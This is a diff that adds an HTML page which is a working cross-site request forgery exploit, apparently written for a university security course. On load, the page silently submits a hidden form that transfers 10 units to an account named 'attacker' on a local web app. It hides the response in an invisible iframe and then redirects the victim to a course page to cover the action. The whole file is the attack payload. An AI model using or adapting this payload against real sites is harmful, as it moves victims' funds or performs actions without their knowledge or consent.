@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.transfer_form.submit()">
+    <script>
+        // iframe loads the first time the page loads, showing a null page.
+        // After we submit our form, the onload function will be called again.
+        // So I had to declare a variable to count how many times the iframe has loaded
+        var times_loaded = 0;
+        function iframe_loaded() {
+            times_loaded++;
+            if (times_loaded == 2)
+                window.location.replace("https://sharif.edu/~kharrazi/courses/40441-011/");
+        }
+    </script>
+    <form target="transfer_frame" name="transfer_form" action="http://localhost:3000/post_transfer" method="post">
+      <input hidden="true" type="text" name="destination_username" value="attacker">
+      <input hidden="true" type="text" name="quantity" value="10">
+    </form>
+    <iframe hidden="true" name="transfer_frame" onload="iframe_loaded()"></iframe>
+</body>
+</html>
